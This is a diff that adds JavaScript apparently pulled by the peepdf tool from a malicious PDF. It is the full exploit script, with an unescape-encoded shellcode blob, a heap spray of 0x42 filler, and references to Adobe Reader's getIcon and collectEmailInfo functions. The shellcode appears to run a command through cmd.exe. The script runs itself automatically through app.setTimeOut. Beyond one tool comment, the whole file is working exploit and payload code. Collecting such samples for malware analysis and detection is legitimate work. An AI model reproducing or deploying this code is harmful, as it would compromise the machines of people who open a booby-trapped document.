@@ -1,0 +1,44 @@
+// peepdf comment: Javascript code located in object 12 (version 0)
+
+var sc
+for (i = 0; i < 18000; i++)
+sc = sc + 0x60
+var unes = unescape
+var strTempA = "byteToChar";
+var strTempB = "getIcon";
+var strTempC = "collectEmailInfo";
+
+function rep(count, what) {
+    var v = "";
+    while (--count >= 0) v += what;
+    return v;
+}
+
+function myunes(buf) {
+    var ret = '';
+    for (var x = 0; x < buf["length"]; x += 2) {
+        ret = ret + util[strTempA](Number('0x' + buf["substr"](x, 2))); //
+    }
+    return ret;
+}
+sc = unes("%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242" + "%u30e8%u0000%uad00%u7d9b%uacdf%uda08%u1676%ufa65" + "%uec10%u0397%ufb0c%ufd97%u330f%u8aca%uea5b%u8a49" + "%ud9e8%u238a%u98e9%u8afe%u700e%uef73%uf636%ub922" + "%u7e7c%ue2d8%u5b73%u8955%u81e5%u48ec%u0002%u8900" + "%ufc5d%u306a%u6459%u018b%u408b%u8b0c%u1c70%u8bad" + "%u0858%u0c6a%u8b59%ufc7d%u5351%u74ff%ufc8f%u8de8" + "%u0002%u5900%u4489%ufc8f%ueee2%u016a%u8d5e%uf445" + "%u5650%u078b%ud0ff%u4589%u3df0%uffff%uffff%u0475" + "%u5646%ue8eb%u003d%u0020%u7700%u4604%ueb56%u6add" + "%u6a00%u6800%u1200%u0000%u8b56%u0447%ud0ff%u006a" + "%u458d%u50ec%u086a%u458d%u50b8%u8b56%u0847%ud0ff" + "%uc085%u0475%u5646%ub4eb%u7d81%u50b8%u5064%u7444" + "%u4604%ueb56%u81a7%ubc7d%ufeef%uaeea%u0474%u5646" + "%u9aeb%u75ff%u6af0%uff40%u0c57%u4589%u85d8%u75c0" + "%ue905%u0205%u0000%u006a%u006a%u006a%uff56%u0457" + "%u006a%u458d%u50ec%u75ff%ufff0%ud875%uff56%u0857" + "%uc085%u0575%ue2e9%u0001%u5600%u57ff%u8b10%ud85d" + "%u838b%u1210%u0000%u4589%u8be8%u1483%u0012%u8900" + "%ue445%u838b%u1218%u0000%u4589%u03e0%ue445%u4503" + "%u89e8%udc45%u8a48%u0394%u121c%u0000%uc230%u9488" + "%u1c03%u0012%u8500%u77c0%u8deb%ub885%ufffe%u50ff" + "%uf868%u0000%uff00%u1457%ubb8d%u121c%u0000%uc981" + "%uffff%uffff%uc031%uaef2%ud1f7%ucf29%ufe89%uca89" + "%ubd8d%ufeb8%uffff%uc981%uffff%uffff%uaef2%u894f" + "%uf3d1%u6aa4%u8d02%ub885%ufffe%u50ff%u7d8b%ufffc" + "%u1857%uff3d%uffff%u75ff%ue905%u014d%u0000%u4589" + "%u89c8%uffc2%ue875%u838d%u121c%u0000%u4503%u50e0" + "%ub952%u0100%u0000%u548a%ufe48%u748a%uff48%u7488" + "%ufe48%u5488%uff48%ueee2%u57ff%uff1c%uc875%u57ff" + "%u8d10%ub885%ufffe%ue8ff%u0000%u0000%u0481%u1024" + "%u0000%u6a00%u5000%u77ff%uff24%u2067%u57ff%u8924" + "%ud045%uc689%uc789%uc981%uffff%uffff%uc031%uaef2" + "%ud1f7%u8949%ucc4d%ubd8d%ufeb8%uffff%u0488%u490f" + "%u048a%u3c0e%u7522%u491f%u048a%u3c0e%u7422%u8807" + "%u0f44%u4901%uf2eb%ucf01%uc781%u0002%u0000%u7d89" + "%ue9c0%u0013%u0000%u048a%u3c0e%u7420%u8806%u0f04" + "%ueb49%u01f3%u47cf%u7d89%uffc0%uf075%u406a%u558b" + "%ufffc%u0c52%u4589%u89d4%u8bc7%ue875%u7503%u01e0" + "%u81de%u1cc6%u0012%u8b00%ue44d%ua4f3%u7d8b%u6afc" + "%uff00%uc075%u57ff%u8918%uc445%uff3d%uffff%u74ff" + "%u576a%uc389%u75ff%ufff0%ud475%uff50%u1c57%uff53" + "%u1057%u7d8b%u81c0%uffc9%uffff%u31ff%uf2c0%uf7ae" + "%u29d1%u89cf%u8dfe%ub8bd%ufffd%uc7ff%u6307%u646d" + "%uc72e%u0447%u7865%u2065%u47c7%u2f08%u2063%u8122" + "%u0cc7%u0000%uf300%u4fa4%u07c6%u4722%u07c6%u5f00" + "%u858d%ufdb8%uffff%u00e8%u0000%u8100%u2404%u0010" + "%u0000%u006a%uff50%u2477%u67ff%u6a20%uff00%u2c57" + "%u5553%u5756%u6c8b%u1824%u458b%u8b3c%u0554%u0178" + "%u8bea%u184a%u5a8b%u0120%ue3eb%u4932%u348b%u018b" + "%u31ee%ufcff%uc031%u38ac%u74e0%uc107%u0dcf%uc701" + "%uf2eb%u7c3b%u1424%ue175%u5a8b%u0124%u66eb%u0c8b" + "%u8b4b%u1c5a%ueb01%u048b%u018b%uebe8%u3102%u89c0" + "%u5fea%u5d5e%uc25b%u0008");
+
+function exp() {
+    blah = rep(128, unes("%u4242%u4242%u4242%u4242%u4242")) + sc;
+    bbk = unes("%u4242%u4242");
+    var h = "getIcon";
+    wap = 0x24 + blah["length"]
+    while (bbk["length"] < wap) bbk += bbk;
+    fillbk = bbk["substring"](0, wap);
+    bk = bbk["substring"](0, bbk["length"] - wap);
+    while (bk["length"] + wap < 0x40000) bk = bk + bk + fillbk;
+    mm = new Array() //ahfafadh2[
+    for (i = 0; i < 300; i++) mm[i] = bk + blah;
+
+}
+
+
+var inBrowser = this.external;
+if (inBrowser) var shaft = app["setTimeOut"]("exp()", 1200);
+else exp();
+
